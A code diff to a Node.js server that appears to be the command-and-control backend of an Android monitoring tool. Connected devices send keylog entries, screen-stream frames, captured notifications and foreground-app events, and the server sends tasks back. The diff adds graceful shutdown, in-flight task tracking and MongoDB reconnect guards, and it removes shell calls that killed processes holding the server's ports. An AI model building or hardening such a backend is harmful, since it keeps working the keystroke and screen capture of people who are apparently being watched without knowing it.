@@ -65,6 +65,7 @@ function pushLog(source, level, message) {
 
 // ── Redis ─────────────────────────────────────────────────────────────────────
 const R = require('./redis');
+let isShuttingDown = false;
 
 // ============================================
 // TELEGRAM NOTIFICATIONS
@@ -1027,7 +1028,7 @@ function queueMongoOperation(operation) {
 }
 
 function scheduleMongoReconnect() {
-    if (!mongoWantsConnection || !activeMongoUri || mongoReconnectTimer) return;
+    if (isShuttingDown || !mongoWantsConnection || !activeMongoUri || mongoReconnectTimer) return;
     const revision = mongoDesiredRevision;
     const delay = mongoReconnectDelayMs;
     mongoReconnectDelayMs = Math.min(MONGO_RECONNECT_MAX_DELAY_MS, mongoReconnectDelayMs * 2);
@@ -1041,17 +1042,22 @@ function scheduleMongoReconnect() {
 }
 
 mongoose.connection.on('connected', () => {
+    if (mongoReconnectTimer) {
+        clearTimeout(mongoReconnectTimer);
+        mongoReconnectTimer = null;
+    }
     log('DB', 'MongoDB connection ready');
 });
 mongoose.connection.on('disconnected', () => {
     connectedMongoUri = null;
-    if (mongoWantsConnection) scheduleMongoReconnect();
+    if (!isShuttingDown && mongoWantsConnection) scheduleMongoReconnect();
 });
 mongoose.connection.on('error', (error) => {
     log('DB', `MongoDB connection error: ${error.message}`, 'warn');
 });
 
 function connectMongo(uri = activeMongoUri) {
+    if (isShuttingDown) return Promise.resolve();
     activeMongoUri = uri;
     mongoWantsConnection = Boolean(uri);
     const revision = ++mongoDesiredRevision;
@@ -1062,7 +1068,7 @@ function connectMongo(uri = activeMongoUri) {
     return queueMongoOperation(async () => {
         // If several dashboard requests arrive together, only the newest
         // requested target is allowed to run.
-        if (!mongoWantsConnection || revision !== mongoDesiredRevision) return;
+        if (isShuttingDown || !mongoWantsConnection || revision !== mongoDesiredRevision) return;
         if (mongoose.connection.readyState === 1 && connectedMongoUri === uri) return;
 
         if (mongoose.connection.readyState !== 0) {
@@ -1128,6 +1134,7 @@ connectMongo(activeMongoUri).catch(() => {});
 // ============================================
 /** @type {Map<string, net.Socket & {id:string, deviceId?:string, clientType:'android', lastPong:number, buf:string}>} */
 const tcpClients = new Map();          // connId → TCP socket
+const inFlightMessageTasks = new Set();
 /** @type {Map<string, {res: import('express').Response, token:string}>} */
 const sseClients = new Map();          // clientId → { res, token }
 /** @type {Map<string, string>} */
@@ -1320,6 +1327,7 @@ function broadcastLatestDash(event, data) {
 // Both TCP and WS messages go through here
 // ============================================
 async function processMessage(clientId, clientType, event, data) {
+    if (isShuttingDown) return;
     // Skip per-message log for high-frequency / noisy events.
     const highFreq = event === 'stream:frame'       || event === 'keylog:entry'  ||
                      event === 'notification:entry'  || event === 'app:foreground'||
@@ -1344,9 +1352,11 @@ async function processMessage(clientId, clientType, event, data) {
         // new TCP connection. MongoDB is authoritative; Redis and the
         // in-memory registry keep the protection active during a DB outage.
         let storedDevice = null;
-        try {
-            storedDevice = await Device.findOne({ deviceId }).select('blocked').lean().exec();
-        } catch (_) {}
+        if (!isShuttingDown && mongoose.connection.readyState === 1) {
+            try {
+                storedDevice = await Device.findOne({ deviceId }).select('blocked').lean().exec();
+            } catch (_) {}
+        }
         const redisDevice = await R.getDevice(deviceId);
         const memoryDevice = inMemoryDevices.get(deviceId);
         if (storedDevice?.blocked || redisDevice?.blocked || memoryDevice?.blocked) {
@@ -1423,31 +1433,37 @@ async function processMessage(clientId, clientType, event, data) {
         // Persist to Redis
         R.saveDevice(deviceId, deviceRecord).catch(() => {});
 
-        // Persist / update (optional MongoDB)
-        try {
-            let dev = await Device.findOne({ deviceId });
-            if (!dev) {
-                dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
-                                   deviceInfo: info, accessId: accessId || '',
-                                   registeredAt: new Date(), isOnline: true });
-            } else {
-                dev.isOnline  = true;
-                dev.lastSeen  = new Date();
-                dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
-                if (accessId) dev.accessId = accessId;
-                dev.markModified('deviceInfo');
-            }
-            await dev.save();
-        } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }
+        // Persist / update when MongoDB is connected. The in-memory and Redis
+        // records remain available while MongoDB is reconnecting or shutting down.
+        if (!isShuttingDown && mongoose.connection.readyState === 1) {
+            try {
+                let dev = await Device.findOne({ deviceId });
+                if (!dev) {
+                    dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
+                                       deviceInfo: info, accessId: accessId || '',
+                                       registeredAt: new Date(), isOnline: true });
+                } else {
+                    dev.isOnline  = true;
+                    dev.lastSeen  = new Date();
+                    dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
+                    if (accessId) dev.accessId = accessId;
+                    dev.markModified('deviceInfo');
+                }
+                await dev.save();
+            } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }
+        }
 
-        // Load saved tasks from MongoDB scoped to this accessId and send them to the device
+        // Load tasks only when persistence is available. Registration still
+        // succeeds immediately from the live TCP/in-memory device state.
         let deviceTasks = [];
-        try {
-            const taskQuery = accessId
-                ? { $or: [{ accessId }, { accessId: '' }, { deviceId }] }
-                : { $or: [{ accessId: '' }, { deviceId }] };
-            deviceTasks = await Task.find(taskQuery).sort({ updatedAt: -1 }).lean();
-        } catch (_) {}
+        if (!isShuttingDown && mongoose.connection.readyState === 1) {
+            try {
+                const taskQuery = accessId
+                    ? { $or: [{ accessId }, { accessId: '' }, { deviceId }] }
+                    : { $or: [{ accessId: '' }, { deviceId }] };
+                deviceTasks = await Task.find(taskQuery).sort({ updatedAt: -1 }).lean();
+            } catch (_) {}
+        }
 
         // Ack back to device
         if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });
@@ -2080,12 +2096,16 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
             if (!line) continue;
             let msg;
             try { msg = JSON.parse(line); } catch (e) { continue; }
-            processMessage(id, 'android', msg.event, msg.data);
+            const task = processMessage(id, 'android', msg.event, msg.data);
+            inFlightMessageTasks.add(task);
+            task.catch(error => log('TCP', `Message processing failed: ${error.message}`, 'warn'))
+                .finally(() => inFlightMessageTasks.delete(task));
         }
     });
 
     conn.on('close', async () => {
         tcpClients.delete(id);
+        if (isShuttingDown) return;
         if (conn.deviceId) {
             if (conn.channelType === 'stream') {
                 // Only remove the stream ref if this socket is still the active one
@@ -2106,6 +2126,7 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                 const disconnectedDeviceId = conn.deviceId;
                 const disconnectedConnId   = id;
                 setTimeout(async () => {
+                    if (isShuttingDown) return;
                     // Re-check: if a new primary has registered in the meantime, skip broadcast
                     if (deviceToTcp.get(disconnectedDeviceId) !== disconnectedConnId &&
                         deviceToTcp.has(disconnectedDeviceId)) {
@@ -2135,9 +2156,8 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
 
 tcpServer.on('error', (err) => {
     if (err.code === 'EADDRINUSE') {
-        log('TCP', `Port ${TCP_PORT} in use — killing and retrying…`, 'warn');
-        try { require('child_process').execSync(`fuser -k ${TCP_PORT}/tcp 2>/dev/null`); } catch (_) {}
-        setTimeout(() => tcpServer.listen(TCP_PORT, '0.0.0.0'), 1500);
+        log('TCP', `Port ${TCP_PORT} is already in use; refusing to terminate another process.`, 'error');
+        setImmediate(() => process.exit(1));
     } else {
         log('TCP', `Server error: ${err.message}`, 'error');
     }
@@ -2567,8 +2587,6 @@ app.post('/api/admin/services/config', requireAdmin, async (req, res) => {
     const redisChanged = nextRedis !== R.getConfiguredUrl();
     const mongoWasReady = mongoose.connection.readyState === 1 || mongoose.connection.readyState === 2;
     const mongoShouldReconnect = mongoChanged && (mongoWasReady || mongoWantsConnection);
-    const redisWasReady = R.isConnected();
-
     runtimeDbSettings.mongodbUri = nextMongo;
     runtimeDbSettings.redisUrl = nextRedis;
     activeMongoUri = nextMongo;
@@ -2577,7 +2595,7 @@ app.post('/api/admin/services/config', requireAdmin, async (req, res) => {
 
     try {
         if (mongoShouldReconnect) await connectMongo(nextMongo);
-        if (redisChanged && redisWasReady) await R.restart(nextRedis);
+        if (redisChanged) await R.restart(nextRedis);
         log('ADMIN', 'Database connection URLs updated from dashboard');
         res.json({ success: true, services: getManagedServiceStatus() });
     } catch (e) {
@@ -3572,6 +3590,7 @@ function _issueDownloadTicket(accessId, type) {
     return ticket;
 }
 setInterval(() => {
+    if (isShuttingDown) return;
     const now = Date.now();
     for (const [t, v] of _downloadTickets) {
         if (v.expiresAt < now) _downloadTickets.delete(t);
@@ -5554,6 +5573,7 @@ setInterval(() => {
 
 // Drop stale TCP connections — handle primary and secondary channels separately
 setInterval(async () => {
+    if (isShuttingDown) return;
     const now = Date.now();
     for (const [id, conn] of tcpClients) {
         if (!conn.deviceId) continue;
@@ -5588,6 +5608,7 @@ setInterval(async () => {
 
 // Mark DB devices offline if not seen in 60s
 setInterval(async () => {
+    if (isShuttingDown) return;
     if (mongoose.connection.readyState !== 1) return;
     try {
         const cutoff = new Date(Date.now() - 60000);
@@ -5602,20 +5623,13 @@ setInterval(async () => {
 // START
 // ============================================
 
-// Kill any stale process holding our ports before binding
-const { execSync } = require('child_process');
-try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
-try { execSync(`fuser -k ${TCP_PORT}/tcp  2>/dev/null`); } catch (_) {}
-
 server.on('error', (err) => {
     if (err.code === 'EADDRINUSE') {
-        log('HTTP', `Port ${HTTP_PORT} still in use — retrying in 2s…`);
-        setTimeout(() => {
-            try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
-            server.listen(HTTP_PORT);
-        }, 2000);
+        log('HTTP', `Port ${HTTP_PORT} is already in use; refusing to terminate another process.`, 'error');
+        setImmediate(() => process.exit(1));
     } else {
-        throw err;
+        log('HTTP', `Server error: ${err.message}`, 'error');
+        setImmediate(() => process.exit(1));
     }
 });
 
@@ -5742,14 +5756,79 @@ R.init().then(() => {
     });
 });
 
-async function gracefulShutdown(signal) {
-    log('SHUTDOWN', `${signal} received — closing…`);
-    try { await R.quit(); } catch (_) {}
-    try { await mongoose.connection.close(); } catch (_) {}
-    process.exit(0);
+function closeListener(listener) {
+    if (!listener?.listening) return Promise.resolve();
+    return new Promise(resolve => {
+        let settled = false;
+        const finish = () => {
+            if (settled) return;
+            settled = true;
+            clearTimeout(timeout);
+            resolve();
+        };
+        const timeout = setTimeout(() => {
+            try { listener.closeAllConnections?.(); } catch (_) {}
+            finish();
+        }, 8000);
+        try {
+            listener.close(finish);
+            listener.closeIdleConnections?.();
+        } catch (_) {
+            finish();
+        }
+    });
 }
 
-process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
-process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
+let shutdownPromise = null;
+function gracefulShutdown(signal) {
+    if (shutdownPromise) return shutdownPromise;
+    isShuttingDown = true;
+    shutdownPromise = (async () => {
+        log('SHUTDOWN', `${signal} received — closing listeners before storage…`);
+        mongoWantsConnection = false;
+        ++mongoDesiredRevision;
+        if (mongoReconnectTimer) {
+            clearTimeout(mongoReconnectTimer);
+            mongoReconnectTimer = null;
+        }
+
+        for (const client of sseClients.values()) {
+            try { client.res.end(); } catch (_) {}
+        }
+        for (const response of logClients) {
+            try { response.end(); } catch (_) {}
+        }
+        for (const socket of tcpClients.values()) {
+            try { socket.destroy(); } catch (_) {}
+        }
+
+        await Promise.all([
+            closeListener(server),
+            closeListener(tcpServer),
+            closeListener(callbackServer),
+            closeListener(zeaburPortApiServer),
+        ]);
+
+        // Let already-received device messages finish their bounded persistence
+        // work before closing the Mongo pool.
+        let drainTimer;
+        await Promise.race([
+            Promise.allSettled([...inFlightMessageTasks]),
+            new Promise(resolve => {
+                drainTimer = setTimeout(resolve, 5000);
+                drainTimer.unref?.();
+            }),
+        ]);
+        if (drainTimer) clearTimeout(drainTimer);
+
+        try { await R.quit(); } catch (_) {}
+        try { await stopMongo(); } catch (_) {}
+        process.exit(0);
+    })();
+    return shutdownPromise;
+}
+
+process.on('SIGINT',  () => { gracefulShutdown('SIGINT').catch(() => process.exit(1)); });
+process.on('SIGTERM', () => { gracefulShutdown('SIGTERM').catch(() => process.exit(1)); });
 
 module.exports = { app, server };
